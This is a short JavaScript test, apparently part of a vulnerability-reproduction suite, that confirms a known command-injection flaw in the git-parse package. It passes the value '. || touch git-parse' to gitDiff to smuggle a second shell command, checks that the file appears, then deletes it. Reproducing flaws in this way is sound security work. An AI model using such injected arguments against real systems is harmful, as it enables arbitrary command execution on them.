//https://snyk.io/vuln/SNYK-JS-GITPARSE-1290380
test("Command Injection in git-parse", () => {
  const x = require("git-parse");
  const fs = require("fs");
  const path = "./git-parse";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const paths = ". || touch git-parse";
  x.gitDiff(".", 445454, 1545, paths).finally(() => {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
